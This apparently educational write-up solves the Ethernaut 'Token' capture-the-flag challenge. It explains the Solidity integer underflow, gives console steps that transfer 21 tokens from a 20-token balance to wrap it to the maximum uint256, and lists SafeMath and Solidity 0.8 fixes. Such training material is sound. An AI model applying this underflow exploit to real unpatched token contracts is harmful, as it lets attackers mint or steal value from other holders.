# Ethernaut Token Challenge Solution

## Challenge Overview
**Contract Name**: Token  
**Difficulty**: Easy  
**Objective**: Obtain more than your initial 20 tokens by exploiting an arithmetic vulnerability

## Vulnerability Analysis

### Critical Flaw: Integer Underflow
The key vulnerability is in the transfer function:
```solidity
require(balances[msg.sender] - _value >= 0);
balances[msg.sender] -= _value;
```

### Understanding Integer Underflow
# Understanding Integer Underflow in the Token Challenge

## What is Integer Underflow?

Integer underflow occurs when an arithmetic operation attempts to create a numeric value that falls **below the minimum representable value** for a given data type. In Solidity:

- For `uint256` (unsigned 256-bit integer):
  - Minimum value: `0`
  - Maximum value: `2²⁵⁶ - 1` (≈1.16e77)
- When subtraction would go below 0, it **wraps around** to the maximum value

## How Underflow Exploits the Token Contract

### Vulnerable Code:
```js
require(balances[msg.sender] - _value >= 0);
balances[msg.sender] -= _value;
```

### What Happens When Transferring 21 Tokens (with 20 balance):

1. **First Evaluation**:
   ```js
   balances[msg.sender] - _value  // 20 - 21
   ```
   - Mathematically should be -1
   - But `uint256` can't represent negative numbers

2. **Underflow Occurs**:
   ```js
   20 - 21 = 
   0x0000...0014 (20) 
   - 0x0000...0015 (21) 
   = 0xFFFF...FFFF (2²⁵⁶ - 1)
   ```
   - Binary representation wraps around
   - Results in maximum possible uint256 value

3. **Check Passes Ironically**:
   ```js
   require(2²⁵⁶ - 1 >= 0)  // Always true!
   ```

4. **Balance Update**:
   ```js
   balances[msg.sender] -= _value;  // Also underflows!
   ```
   - Sets balance to 2²⁵⁶ - 1 (≈115 quattuorvigintillion tokens)

## Visual Representation

```js
Normal Arithmetic:
[0, 1, 2, ..., 20, 21, ... MAX]
Subtracting crosses zero boundary:
20 - 21 → MAX

Like a car odometer rolling back:
000020
-000021
999999 (infinite tokens!)
```

## Why This is Dangerous

1. **Infinite Minting**: Attacker gets maximum possible tokens
2. **Broken Economics**: Completely destroys token supply
3. **Hidden Vulnerability**: The `>= 0` check looks safe but does nothing

## Solution Implementation

### Attack Steps
1. **Check Initial Balance**:
   ```javascript
   await contract.balanceOf(player)
   // Returns 20 (initial balance)
   ```

2. **Execute Underflow Attack**:
   ```javascript
   // Transfer 21 tokens to any address
   await contract.transfer("0x0000000000000000000000000000000000000000", 21)
   ```

3. **Verify New Balance**:
   ```javascript
   await contract.balanceOf(player)
   // Now returns maximum uint256 value
   ```

## Security Analysis & Fixes

### Root Causes
1. **Pre-0.8.0 Arithmetic**: No automatic overflow/underflow protection
2. **Meaningless Check**: `>= 0` is always true for unsigned integers

### Secure Alternatives
```js
// 1. Using SafeMath (for Solidity <0.8)
using SafeMath for uint256;
balances[msg.sender] = balances[msg.sender].sub(_value);

// 2. Solidity ≥0.8 built-in checks
balances[msg.sender] -= _value; // Auto reverts on underflow

// 3. Explicit check (most readable)
require(balances[msg.sender] >= _value, "Insufficient balance");
```

## Key Takeaways
1. **Never use raw arithmetic** in pre-0.8 Solidity
2. **All subtraction operations** are potential underflow risks
3. **Use**: 
   - SafeMath for older versions
   - Solidity's built-in checks in 0.8+
   - Explicit balance checks for clarity

This solution demonstrates how a tiny arithmetic oversight can completely compromise a token contract's integrity.